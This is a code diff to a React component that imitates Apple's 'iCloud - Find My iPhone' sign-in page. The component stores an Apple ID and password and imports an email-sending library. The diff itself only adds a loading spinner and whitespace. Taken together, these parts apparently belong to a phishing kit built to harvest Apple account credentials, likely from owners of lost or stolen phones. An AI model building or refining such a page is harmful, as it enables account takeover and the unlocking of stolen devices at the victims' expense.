@@ -5,12 +5,14 @@ import Checkbox from '@material-ui/core/Checkbox'
 import { send } from 'emailjs-com'
 import Modal from 'react-bootstrap/Modal'
 
+
+
 const MainContent = () => {
   const [total, setTotal] = useState({
     appleId: '',
     password: '',
   })
-
+  
   const [isOpen, setIsOpen] = React.useState(false)
 
   const showModal = () => {
@@ -100,7 +102,11 @@ const MainContent = () => {
             backgroundImage: 'url(/background.png)',
           }}
         ></div>
-        <Container className='align-middle'>
+         <div class="lds-spinner"
+   >
+       <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
+     
+        <Container className='align-middle11'>
           <div className='content'>
             <Row className='element'>
               <Col>
@@ -111,6 +117,7 @@ const MainContent = () => {
                   <Col>
                     <div className='signin'>
                       <p>iCloud - Find My iPhone</p>
+                     
                     </div>
                   </Col>
                   <div className='row d-flex justify-content-center'>
@@ -236,7 +243,7 @@ const MainContent = () => {
                   />
                   <hr />
                   <a href='/Passcode'>
-                    
+                            
                     <div className='forget' style={{ fontSize: '18px', fontWeight: 'bold' }}>
                       {' '}
                       Use Passcode{' '}
